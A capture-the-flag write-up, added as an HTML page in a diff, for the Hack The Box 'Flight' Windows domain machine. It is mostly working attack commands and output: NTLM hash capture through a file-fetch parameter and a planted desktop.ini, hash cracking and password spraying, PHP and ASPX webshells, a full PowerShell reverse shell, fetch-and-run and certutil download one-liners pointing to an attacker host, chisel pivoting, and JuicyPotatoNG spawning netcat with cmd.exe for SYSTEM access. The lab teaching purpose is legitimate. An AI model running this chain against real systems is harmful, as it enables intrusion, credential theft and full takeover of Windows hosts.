@@ -1,0 +1,382 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Flight [Hard] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.fe9a01128f24537e52223a846795c30968baf4cbb17d0f03a14ea859993459ca.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Flight [Hard]"/>
+<meta name="twitter:description" content="TCP Scan &gt; TARGET=10.129.69.58 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) | http-methods: | Supported Methods: OPTIONS HEAD GET POST TRACE |_ Potentially risky methods: TRACE |_http-title: g0 Aviation |_http-server-header: Apache/2."/>
+
+    <meta property="og:title" content="HTB - Flight [Hard]" />
+<meta property="og:description" content="TCP Scan &gt; TARGET=10.129.69.58 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) | http-methods: | Supported Methods: OPTIONS HEAD GET POST TRACE |_ Potentially risky methods: TRACE |_http-title: g0 Aviation |_http-server-header: Apache/2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/htb/flight/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-11-07T12:02:16+13:00" />
+<meta property="article:modified_time" content="2022-11-07T12:02:16+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href=""><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-SLVHGT13XR');
+</script>
+      <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
+     crossorigin="anonymous"></script>
+      <h1 class ="post-title">HTB - Flight [Hard]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Nov 7, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          8 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="tcp-scan">TCP Scan</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.69.58 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+| http-methods: 
+|   Supported Methods: OPTIONS HEAD GET POST TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: g0 Aviation
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-11-06 14:28:59Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+52871/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+</code></pre><ul>
+<li>Domain found: <code>flight.htb</code></li>
+</ul>
+<h1 id="web-enum">Web Enum</h1>
+<ul>
+<li>Subdomain enum</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://flight.htb/&#34; -H &#34;Host: FUZZ.flight.htb&#34; --hl 154
+
+000000624:   200        90 L     412 W      3996 Ch     &#34;school&#34;
+</code></pre><ul>
+<li>Browsing to the subdomain found a url parameter: <code>http://school.flight.htb/index.php?view=home.html</code></li>
+<li>First suspicion, this may be vulnerable to LFI.</li>
+<li>After a bit enum, found an error output when browsed to <code>http://school.flight.htb/index.php?view=index.php</code>. Then inspect the source code found the following php code in the source.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#66d9ef">E_ERROR</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">E_WARNING</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">E_PARSE</span>); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>])){
+</span></span><span style="display:flex;"><span>$file<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;view&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">urldecode</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>]),<span style="color:#e6db74">&#39;..&#39;</span>)<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>)<span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">urldecode</span>(<span style="color:#a6e22e">strtolower</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>])),<span style="color:#e6db74">&#39;filter&#39;</span>)<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>)<span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">urldecode</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>]),<span style="color:#e6db74">&#39;\\&#39;</span>)<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>)<span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">urldecode</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>]),<span style="color:#e6db74">&#39;htaccess&#39;</span>)<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>)<span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">strpos</span>(<span style="color:#a6e22e">urldecode</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>]),<span style="color:#e6db74">&#39;.shtml&#39;</span>)<span style="color:#f92672">!==</span><span style="color:#66d9ef">false</span>)
+</span></span><span style="display:flex;"><span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h1&gt;Suspicious Activity Blocked!&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h3&gt;Incident will be reported&lt;/h3&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>]);	
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">xampp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">htdocs</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">school.flight.htb</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">home.html&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>The url validation part prevents us from doing LFI. But we can use this code to force the service to fetch a remote source using Windows network share syntax: <code>//ip&gt;/&lt;share&gt;</code> and attempt to capture the hash of a service.</li>
+</ul>
+<h1 id="capture-service-account-hash">Capture service account hash</h1>
+<ul>
+<li>A service account <code>svc_apache</code> and its ntlm hash can be captured</li>
+</ul>
+<pre tabindex="0"><code># In browser
+&gt; http://school.flight.htb/index.php?view=//&lt;ip&gt;/test
+
+# In kali
+&gt; responder -I tun0 -wP
+
+[SMB] NTLMv2-SSP Client   : 10.129.69.58
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:8f18f6aaeb23aaca:&lt;hash&gt;:&lt;hash&gt;
+</code></pre><ul>
+<li>Crack the hash using hashcat: <code>S*********3</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; hashcat.exe --force -m 5600 hash.txt rockyou.txt
+</code></pre><h1 id="smb-enum">SMB Enum</h1>
+<ul>
+<li>From above, we have captured a credential that can be used to access SMB. Then enum SMB</li>
+</ul>
+<pre tabindex="0"><code># List shares
+&gt; smbclient -L //flight.htb/ -U svc_apache
+
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share 
+Shared          Disk      
+SYSVOL          Disk      Logon server share 
+Users           Disk      
+Web             Disk
+
+# Users share
+&gt; smbclient //flight.htb/Users -U svc_apache
+lpcfg_do_global_parameter: WARNING: The &#34;syslog&#34; option is deprecated
+Password for [WORKGROUP\svc_apache]:
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
+  .                                  DR        0  Thu Sep 22 16:16:56 2022
+  ..                                 DR        0  Thu Sep 22 16:16:56 2022
+  .NET v4.5                           D        0  Thu Sep 22 15:28:03 2022
+  .NET v4.5 Classic                   D        0  Thu Sep 22 15:28:02 2022
+  Administrator                       D        0  Mon Oct 31 14:34:00 2022
+  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
+  C.Bum                               D        0  Thu Sep 22 16:08:23 2022
+  Default                           DHR        0  Tue Jul 20 15:20:24 2021
+  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
+  Public                             DR        0  Tue Jul 20 15:23:25 2021
+  svc_apache                          D        0  Fri Oct 21 14:50:21 2022
+</code></pre><h1 id="ad-enum">AD enum</h1>
+<ul>
+<li>Perform enum on SMB using the previously obtained credential</li>
+</ul>
+<pre tabindex="0"><code>&gt; ~/tools/cme/cme smb flight.htb -u svc_apache -p &#39;S*********3&#39; --users                            
+SMB    flight.htb      445    G0     flight.htb\O.Possum          badpwdcount: 0 desc: Helpdesk
+SMB    flight.htb      445    G0     flight.htb\svc_apache        badpwdcount: 0 desc: Service Apache web
+SMB    flight.htb      445    G0     flight.htb\V.Stevens         badpwdcount: 0 desc: Secretary
+SMB    flight.htb      445    G0     flight.htb\D.Truff           badpwdcount: 0 desc: Project Manager
+SMB    flight.htb      445    G0     flight.htb\I.Francis         badpwdcount: 0 desc: Nobody knows why he&#39;s here
+SMB    flight.htb      445    G0     flight.htb\W.Walker          badpwdcount: 0 desc: Payroll officer
+SMB    flight.htb      445    G0     flight.htb\C.Bum             badpwdcount: 1 desc: Senior Web Developer
+SMB    flight.htb      445    G0     flight.htb\M.Gold            badpwdcount: 0 desc: Sysadmin
+SMB    flight.htb      445    G0     flight.htb\L.Kein            badpwdcount: 0 desc: Penetration tester
+SMB    flight.htb      445    G0     flight.htb\G.Lors            badpwdcount: 0 desc: Sales manager
+SMB    flight.htb      445    G0     flight.htb\R.Cold            badpwdcount: 0 desc: HR Assistant
+SMB    flight.htb      445    G0     flight.htb\S.Moon            badpwdcount: 0 desc: Junion Web Developer
+</code></pre><ul>
+<li>Using a similar approach, we learnt that another user <code>s.moon</code> is using the same password as <code>svc_apache</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; ~/tools/cme/cme smb flight.htb -u users.txt -p &#39;S*********3&#39; --continue-on-success
+SMB    flight.htb      445    G0     [-] flight.htb\O.Possum:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [+] flight.htb\svc_apache:S*********3 
+SMB    flight.htb      445    G0     [-] flight.htb\V.Stevens:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [-] flight.htb\D.Truff:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [-] flight.htb\I.Francis:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [-] flight.htb\W.Walker:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [-] flight.htb\C.Bum:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [-] flight.htb\M.Gold:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [-] flight.htb\L.Kein:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [-] flight.htb\G.Lors:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [-] flight.htb\R.Cold:S*********3 STATUS_LOGON_FAILURE 
+SMB    flight.htb      445    G0     [+] flight.htb\S.Moon:S*********3
+</code></pre><h1 id="user-cbum">User: c.bum</h1>
+<ul>
+<li>Using impacket-smbexec, we can find out which share is writable. But there seems to be customised code that prevents a lot of file types to be written: <code>Shared</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; impacket-psexec flight.htb/s.moon@g0.flight.htb
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on g0.flight.htb.....
+[-] share &#39;ADMIN$&#39; is not writable.
+[-] share &#39;C$&#39; is not writable.
+[-] share &#39;NETLOGON&#39; is not writable.
+[*] Found writable share Shared
+[*] Uploading file UCspwDOu.exe
+[-] Error uploading file UCspwDOu.exe, aborting.....
+[-] Error performing the installation, cleaning up: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+</code></pre><ul>
+<li>Create a <code>desktop.ini</code> file with the following content. For more detail, refer to <a href="https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini">https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini</a></li>
+</ul>
+<pre tabindex="0"><code>[.ShellClassInfo]
+IconResource=\\&lt;ip&gt;\test
+</code></pre><ul>
+<li>Then upload this file to smb: <code>Shared</code>. Then setup <code>responder</code> again and wait for an autobot to trigger the file load to capture <code>c.bum</code> hash.</li>
+</ul>
+<pre tabindex="0"><code># upload desktop.ini
+&gt; smbclient //flight.htb/shared -U s.moon
+&gt; put desktop.ini
+
+# listen for hash
+&gt; responder -I tun0 -wF -v
+</code></pre><ul>
+<li>Crack c.bum&rsquo;s password: <code>T*****************4</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; hashcat.exe --force -m 5600 hash.txt rockyou.txt
+</code></pre><ul>
+<li>You can now smb as c.bum to share: <code>Users</code> and capture the user flag</li>
+</ul>
+<h1 id="reverse-shell-cbum">reverse-shell: c.bum</h1>
+<ul>
+<li><code>c.bum</code> user can write to the share: <code>Web</code></li>
+<li>Create a simple php backdoor under <code>web/school.flight.htb</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; /usr/share/webshells/php/simple-backdoor.php
+# upload it to smb
+</code></pre><ul>
+<li>Prepare a powershell reverse shell and serve it with http</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;&lt;ip&gt;&#34;</span>,4444);$stream = $client.GetStream();<span style="color:#66d9ef">[byte[]]</span>$bytes = 0..65535|%{0};<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style="color:#f92672">-ne</span> 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + <span style="color:#e6db74">&#34;PS &#34;</span> + (pwd).Path + <span style="color:#e6db74">&#34;&gt; &#34;</span>;$sendbyte = (<span style="color:#66d9ef">[text.encoding]</span>::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</span></span></code></pre></div><ul>
+<li>Trigger the shell via browser and listen with <code>nc</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; http://school.flight.htb/w.php?cmd=powershell.exe+IEX(New-Object%20Net.WebClient).DownloadString(%27http://&lt;ip&gt;/shell.ps1%27)
+</code></pre><ul>
+<li>You should receive a reverse shell as <code>svc_apache</code></li>
+<li>Switch to <code>c.bum</code> using runascs: <a href="https://github.com/antonioCoco/RunasCs/tree/master">https://github.com/antonioCoco/RunasCs/tree/master</a></li>
+</ul>
+<pre tabindex="0"><code># upload Runascs.exe, then setup a listener
+# it&#39;s more convenient to run two sessions as c.bum for later your&#39;ll find out (one for pivot, another for operation)
+&gt; certutil.exe -urlcache -f http://&lt;ip&gt;/RunasCs.exe RunasCs.exe
+&gt; .\Runascs.exe c.bum T*****************4 powershell -r &lt;ip&gt;:5555
+</code></pre><h1 id="pe">PE</h1>
+<ul>
+<li>Perform local enum (or use winpease) found a locally running web service at <code>8000</code></li>
+</ul>
+<pre tabindex="0"><code>Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
+</code></pre><ul>
+<li>This process is run as system (pid=4)</li>
+</ul>
+<pre tabindex="0"><code>&gt; tasklist /fi &#34;pid eq 4&#34;
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System                           4 Services                   0        156 K
+</code></pre><ul>
+<li>Setup pivot to examine further into this internal process</li>
+</ul>
+<pre tabindex="0"><code># upload chisel.exe to target
+&gt; certutil.exe -urlcache -f http://&lt;ip&gt;/chisel.exe chisel.exe
+
+# on kali
+&gt; chisel server -p 9999 --reverse
+
+# on target
+&gt; .\chisel.exe client --max-retry-count=1 &lt;ip&gt;:9999 R:8000:127.0.0.1:8000
+</code></pre><ul>
+<li>Browse to <code>http://127.0.0.1:8000/</code> to view the internal page</li>
+<li>Upload a aspx shell to the <code>c:\inetpub\development\</code> folder</li>
+</ul>
+<pre tabindex="0"><code># shell i used
+&gt; /usr/share/webshells/aspx/cmdasp.aspx
+
+# on target as c.bum
+# note: c:\inetpub\development\ gets cleaned up very quickly, keep a copy of cmdasp.aspx on the target for convenience
+&gt; cd c:\users\c.bum\desktop\
+&gt; certutil.exe -urlcache -f http://&lt;ip&gt;/cmdasp.aspx cmdasp.aspx
+&gt; copy c:\users\c.bum\desktop\cmdasp.aspx c:\inetpub\development\
+</code></pre><ul>
+<li>Browse to the webshell and perform enum: <code>http://127.0.0.1:8000/cmdasp.aspx</code></li>
+<li>The iis service has <code>SeImpersonatePrivilege</code> privilege. This can be exploited using <code>juicypotato</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; whoami
+iis apppool\defaultapppool
+
+&gt; whoami /priv
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre><ul>
+<li>Receive a reverse shell as <code>iis apppool\defaultapppool</code></li>
+</ul>
+<pre tabindex="0"><code># note: change the shell.ps1 script to point to a different port to avoid confusion
+&gt; powershell.exe IEX(New-Object Net.WebClient).DownloadString(&#39;http://&lt;ip&gt;/shell.ps1&#39;)
+</code></pre><ul>
+<li>PE preparation</li>
+</ul>
+<pre tabindex="0"><code># upload juicypotato and nc64.exe to the target to c:\users\c.bum\desktop\
+# https://github.com/antonioCoco/JuicyPotatoNG
+# https://eternallybored.org/misc/netcat/
+&gt; certutil.exe -urlcache -f http://&lt;ip&gt;/nc64.exe nc64.exe
+&gt; certutil.exe -urlcache -f http://&lt;ip&gt;/JuicyPotatoNG.exe JuicyPotatoNG.exe
+
+# allow both binaries to be run by everyone
+&gt; icacls .\nc64.exe /grant Everyone:F
+&gt; icacls .\JuicyPotatoNG.exe /grant Everyone:F
+
+# Setup a nc listener
+&gt; nc -vnlp 7777
+</code></pre><ul>
+<li>From the shell of <code>iis apppool\defaultapppool</code>, run the potato to get a reverse shell to get the root flag</li>
+</ul>
+<pre tabindex="0"><code>&gt; c:\users\c.bum\desktop\JuicyPotatoNG.exe -t * -p &#34;C:\users\c.bum\desktop\nc64.exe&#34; -a &#34;&lt;ip&gt; 7777 -e cmd.exe&#34;
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
